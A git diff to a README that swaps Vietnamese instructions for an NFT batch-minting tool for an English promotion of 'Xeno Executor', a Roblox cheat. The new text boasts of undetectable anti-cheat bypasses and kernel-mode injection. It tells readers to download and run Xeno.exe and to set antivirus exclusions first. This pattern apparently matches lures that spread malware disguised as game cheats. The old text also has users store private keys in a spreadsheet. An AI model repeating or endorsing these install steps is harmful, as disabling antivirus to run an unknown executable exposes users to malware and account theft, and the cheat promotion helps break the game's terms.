@@ -1,85 +1,56 @@
-# Chơi mint hàng loạt các nft/nfts
+# 👽 Xeno Executor - The Alien-Powered Roblox Exploit
 
-- Chức năng chính:
-  + Áp dụng dễ dàng với những lệnh mint có hexdata đơn giản
-  + Gom NFT về 1 ví
+**Xeno Executor** is an ultra-modern **Roblox script executor** engineered for unmatched performance and stealth. With its next-gen technology, Xeno delivers flawless script execution while remaining completely undetectable.
 
+> 🚀 Hyper-Fast • 👽 Stealthy • 🔥 Powerful • 🛡️ Secure
 
-## Cài Node js
+---
 
-- [Node.js](https://nodejs.org/) (v14 or higher)
-- npm (Node Package Manager)
+## ✅ Features
 
-## Installation
+- ⚡ **Lightning Execution**  
+  High-optimized Lua engine for instant script injection with zero lag.
 
-1. Clone the repository:
+- 🕵️ **Military-Grade Obfuscation**  
+  Advanced anti-detection tech to bypass even the newest Roblox AC.
 
-   ```bash
-   git clone https://github.com/voztoy/auto_mint_batch_collect.git
-   cd auto_mint_batch_collect
-   ```
+- 📦 **Premium Script Hub**  
+  Exclusive library of private scripts, updated hourly.
 
-2. Install the necessary packages:
+- 🛡️ **Self-Healing Bypasses**  
+  Auto-updating protection that adapts to Roblox patches in real-time.
 
-   ```bash
-   npm init -y
-   npm install
-   npm install ethers@5
-   npm install xlsx
-   npm install dotenv
-   
-   ```
-3.  Tham số data.xlsx
-- Privatekey từ ô A2 trở xuống, có 0x
-- Địa chỉ ví ở ô B2 trở xuống
-- Contract mint ở ô C2 trở xuống
-- Hexdata ở ô B2 trở xuống
+- 🖥️ **Futuristic UI**  
+  Cyber-themed interface with RGB customization and animated elements.
 
+- ⚙️ **Hybrid Injection**  
+  Combines kernel-mode stability with usermode flexibility.
 
-## Cách chạy
+---
 
-Trước khi chạy node cần lưu ý set node
+## 🔧 Installation
 
-- Set RPC
+1. **Grab latest build** from [Releases](../../releases)
+2. Unzip package
+3. Run `Xeno.exe`
+4. Inject & dominate!
 
-- Set gaslimit và gasprice trước khi mint
+---
 
-- Set số lượng batch (chạy song song) tuỳ thuộc độ khoẻ của RPC)
+## 🛠️ Requirements
 
-- Set contract
+- ✅ Windows 10/11 (22H2+)
+- ✅ .NET 6.0 Runtime
+- ✅ AV Exclusions set
 
-- Set ví nhận
+---
 
-- Cấu trúc .env
-   ```bash
-   RPC_URL=
-   NFT_CONTRACT=
-   TO_ADDRESS=
-   ```
+## 📜 License
 
-1. Sử dụng index_hash_results_batch.js để mint
+Xeno operates under strict private licensing. Commercial use requires written permission.
 
-- Sau khi mint đẻ ra file results.xlxs chứa hash
+---
 
-- Gom NFT về một ví sử dụng 2 loại node sau:
-   +  transferNFTs_1_NFT.js nếu hash chứa 1 nft
-   +  transferNFTs_2_NFT.js nếu hash chứa 2 nft
+## ⚠️ Disclaimer
 
-   => Cả 2 node đều lấy dữ liệu privkey và hash từ results.xlxs và sử dụng rpc, contract, ví nhận ở .evn
-
-   => Áp dụng cho cả 2 ERC721 và ERC1155,
-
-- Gom NFTs về 1 ví sử dụng node Gom_ERC1155.js
-
-   => Chỉ áp dụng cho RC1155, node chỉ cần sử dụng privateky ở data.xlsx (rpc, contract, ví nhận cần thay trong node)
-
-
-2.  Sử dụng index_mint_transfer_all.js để mint
-
-Node này mint xong gửi nft/nfts ngay sau khi mint về ví nhận, với điều kiện rpc khoẻ
-
-
-## Donations
-
-0xADE4FBED97eF37F3BfbaF36B575a1B114DA92155
-
+Xeno is for educational penetration testing only. Not endorsed by Roblox Corp.
